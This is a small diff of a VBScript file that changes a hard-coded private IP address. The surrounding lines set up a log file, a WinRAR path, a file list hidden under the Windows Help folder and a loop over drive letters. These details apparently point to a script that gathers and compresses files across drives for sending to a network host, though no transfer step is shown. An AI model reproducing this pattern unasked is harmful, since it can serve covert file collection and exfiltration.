@@ -6,7 +6,7 @@ Set objFile = fso.CreateTextFile(logfile,True)
 objFile.Write "Created log file" & vbCrLf
 
 rar = Chr(34) & "C:\Program Files\WinRAR\Rar.exe" & Chr(34)
-ip = "10.26.3.105"
+ip = "192.168.1.127"
 fileExtensions = "C:\Windows\Help\en-US\0.txt"
 
 For i = Asc("A") to Asc("Z")
